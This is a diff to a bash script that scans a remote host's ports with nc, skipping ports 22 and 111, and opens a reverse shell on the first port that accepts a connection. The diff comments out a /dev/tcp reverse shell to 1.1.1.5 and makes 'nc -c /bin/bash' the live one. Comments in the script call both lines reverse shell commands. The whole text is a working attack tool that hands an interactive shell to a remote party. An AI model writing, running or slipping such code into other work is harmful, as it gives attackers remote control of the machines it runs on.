@@ -11,16 +11,28 @@ remote_port=0
 
 while true
 do
+    # skips over the ssh port and the rpc port
+    if [ $remote_port == 22 -o $remote_port == 111 ]; then
+        ((remote_port++))
+    fi
+
     # Try to connect to the remote host using nc
     if nc -zv $remote_host $remote_port &> /dev/null; then
     
-    echo "Connection succeeded. Opening shell."
+        echo "Connection succeeded on port $remote_port. Opening shell."
     
-    /bin/bash -i >& /dev/tcp/1.1.1.5/$remote_port 0>&1
-    break
+        ## THE FOLLOWING TWO LINES ARE TWO DIFFERENT REVERSE SHELL COMMANDS
+        # bash syntax
+        # /bin/bash -i >& /dev/tcp/1.1.1.5/$remote_port 0>&1
+        
+        #using netcat
+        nc -c /bin/bash $remote_host $remote_port
+
+
+        break # break out of while loop
     else
-    echo "Connection refused, trying next port."
-    ((remote_port++))
+        echo "Connection refused on port $remote_port, trying next port."
+        ((remote_port++))
     fi
 done
 
